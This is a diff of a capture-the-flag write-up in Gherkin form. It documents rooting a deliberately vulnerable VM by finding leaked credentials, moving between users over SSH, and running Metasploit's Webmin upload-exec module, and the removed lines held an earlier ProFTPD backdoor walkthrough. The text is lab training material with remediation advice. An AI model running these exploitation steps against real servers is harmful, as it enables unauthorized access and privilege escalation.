@@ -15,7 +15,7 @@ Feature:
     REQ.061: https://docs.fluidattacks.com/criteria/vulnerabilities/061
     REQ.359: https://docs.fluidattacks.com/criteria/vulnerabilities/359
   Goal:
-    Get root privileges and get flag from root 
+    Get root privileges and get flag from root
   Recommendation:
     Upgrade tools like Webmin, don't save credentials in source code and files
 
@@ -33,105 +33,135 @@ Feature:
     Given a .ova file
     Then I ran the file in Virtualbox
     Then I could see the virtual machine was running [evidence](01.png)
-    And the server is running FTP version ProFTPD 1.3.3c
-    And SSH version OpenSSH 7.2p2
-    And SMTP version Postfix smtpd
-    And HTTP version Apache httpd 2.4.18
-    And POP3 version Dovecot pop3d
-    And SAMBA version smbd 3.X - 4.X and smbd 4.3.11-Ubuntu
-    And IMAP version Dovecot imapd
+    And the server is running SSH version OpenSSH 7.6p1
+    And HTTP version Apache httpd 2.4.29
+    And HTTP version Webmin MiniServ 1.910
 
   Scenario: Normal use case
     Given access to a virtual server
+    And a mac address [evidence](02.png)
     Then I execute the following commands:
     """
     $ nmap -sP 192.168.1.0/24
-    $ sudo arp-scan -l
+    $ sudo arp-scan -l | grep 08
     """
-    When looking at the result [evidence](02.png)
+    When looking at the result [evidence](03.png)
     Then I decided to visit the site:
     """
-    http://192.168.1.108/
+    http://192.168.1.7/
     """
     When looking in the browser
-    Then I saw just an error on the web page [evidence](03.png)
+    Then I saw the initial apache2 configuration [evidence](04.png)
 
   Scenario: Dynamic detection
-    Given an IPv4 address 192.168.1.108
+    Given an IPv4 address 192.168.1.7
     Then I ran a scan report
     And I execute the following command:
     """
-    $ nmap -p- -sV -sC 192.168.1.108
+    $ nmap -p- -sV -sC 192.168.1.7
     """
-    Then I could see services and which ports are open [evidence](04.png)
+    Then I could see services and which ports are open [evidence](05.png)
     And I decided to explore the different ports
-    Then I noted that port 21 was used by FTP
-    And its version ProFTPD 1.3.3c
-    When looking for a ProFTPD 1.3.3c vulnerability
-    Then I found the following article [evidence](05.png)
-    """
-    https://www.exploit-db.com/exploits/16921
-    """
-    When I checked it was something interesting
     Then I noted that port 22 was used by SSH
-    And its version OpenSSH 7.2p2
-    Then I noted that port 25 was used by SMTP
-    And its version Postfix smtpd
+    And its version OpenSSH 7.6p1
     Then I noted that port 80 was used by HTTP
-    And its version Apache httpd 2.4.18
-    When looking in the browser, I see a web page
-    And there was just an error on the web page
-    Then I noted that port 110 was used by POP3
-    And its version Dovecot pop3d
-    Then I noted that port 139 was used by SAMBA
-    And its version smbd 3.X - 4.X
-    When looking for a SAMBA vulnerability
-    Then I execute the following command: [evidence](06.png)
-    """
-    $ smbclient -L 192.168.1.108
-    """
-    Then I execute one more command: [evidence](07.png)
-    """
-    $ smbmap -H 192.168.1.108
-    """
-    When I checked it
-    Then I noted that there was no access using SAMBA
-    Then I noted that port 143 was used by IMAP
-    And its version Dovecot imapd
-    Then I noted that port 445 was used by SAMBA
-    And its version smbd 4.3.11-Ubuntu
+    And its version Apache httpd 2.4.29
+    Then I noted that port 1000 was used by HTTP
+    And its version Webmin MiniServ 1.910
     Then I decided to search possible hidden directories with gobuster
     And I execute the following command:
     """
-    $ gobuster dir -u http://192.168.1.108
+    $ gobuster dir -u http://192.168.1.7
     -w /usr/share/wordlist/dirb/common.txt
     """
-    Then I got the next result [evidence](08.png)
+    Then I got the next result [evidence](06.png)
     When I checked it was not something interesting
-    Then I could conclude that I can only use msfconsole
-    And exploit the ProFTPD 1.3.3c vulnerability
+    Then I used a bigger wordlist
+    And I execute the following command:
+    """
+    $ gobuster dir -u http://192.168.1.7 -w
+    /usr/share/dirbuster/wordlist/directory-list-lowercase-2.3-medium.txt
+    """
+    Then I got a directory to look at called "rips" [evidence](07.png)
+    Then I decided to visit the site:
+    """
+    http://192.168.1.7/rips
+    """
+    When looking in the browser
+    Then I saw the rips scanner tool [evidence](08.png)
+    Then I decided to scan the default file "/var/www"
+    Then I got a file called "secret.php"
+    When looking at its content
+    Then I could see a username and a password [evidence](09.png)
+    Then I decided to visit the site from webmin tool:
+    """
+    https://192.168.1.7:1000
+    """
+    When looking in the browser
+    Then I could see a login form [evidence](10.png)
+    When looking for a Webmin MiniServ 1.910 vulnerability
+    Then I found the following article [evidence](11.png)
+    """
+    https://www.exploit-db.com/exploits/46984
+    """
+    When I checked it was an arbitrary command execution vulnerability
+    And that I needed a username and a password to execute it
+    Then I could conclude that I needed to look for webmin credentials
+    And exploit the Webmin MiniServ 1.910 vulnerability
 
   Scenario: Exploitation
-    Given the FTP service 192.168.1.108:21
-    And the ProFTPD 1.3.3c vulnerability
-    Then I could execute a backdoor command execution using msfconsole
-    Then I run the following commands: [evidence](09.png)
+    Given the site https://192.168.1.7:1000
+    And the Webmin MiniServ 1.910 vulnerability
+    And a username and a password
+    Then I could use SSH using the given credentials
+    Then I execute the following command: [evidence](12.png)
+    """
+    $ ssh ripper@192.168.1.7
+    """
+    Then I become the ripper user
+    When looking for files that the user "ripper" could read
+    Then I execute the following command:
+    """
+    $ find / -user ripper 2>/dev/null
+    """
+    Then I got a file called "secret.file" [evidence](13.png)
+    When looking at its content
+    Then I could see a password
+    And probably for the other user called "cubes"[evidence](14.png)
+    Then I changed the user using the following command:
+    """
+    $ su - cubes
+    """
+    When looking for files that the user "cubes" could read
+    Then I execute the following command: [evidence](15.png)
+    """
+    $ find / -user cubes 2>/dev/null
+    """
+    Then I got a file called "miniser.log" [evidence](16.png)
+    When looking at its content
+    Then I could see a webmin authentication log
+    And a username and a password [evidence](17.png)
+    Then I could execute an arbitrary command using msfconsole
+    Then I run the following commands: [evidence](18.png)
     """
     $ msfconsole
-    > search proftpd_133c_backdoor
-    > use exploit/unix/ftp/proftpd_133c_backdoor
-    > set RHOSTS 192.168.1.108
-    > set payload payload/cmd/unix/reverse
+    > search webmin
+    > use exploit/unix/webapp/webmin_upload_exec
+    > set RHOSTS 192.168.1.7
+    > set USERNAME admin
+    > set PASSWORD tokiohotel
     > set LHOST 192.168.1.106
+    > set SSL true
     > exploit
     """
-    When I got a positive response [evidence](10.png)
-    Then I become the root user [evidence](11.png)
-    And I got the flag [evidence](12.png)
+    When I got a positive response [evidence](19.png)
+    Then I become the root user
+    And I got the flag [evidence](20.png)
 
   Scenario: Remediation
     Given that the system has a vulnerability
-    Then is necessary to upgrade the FTP service
+    Then is necessary to upgrade the Webmin tool
+    And is necessary to avoid saving credentials in files or source code
     Then I can confirm that the server is less vulnerable
 
   Scenario: Scoring
@@ -144,4 +174,4 @@ Feature:
     7.0/10 (High) - CR:M/IR:M/AR:M
 
   Scenario: Correlations
-    No correlations have been found to this date 2022-07-06
+    No correlations have been found to this date 2022-07-25
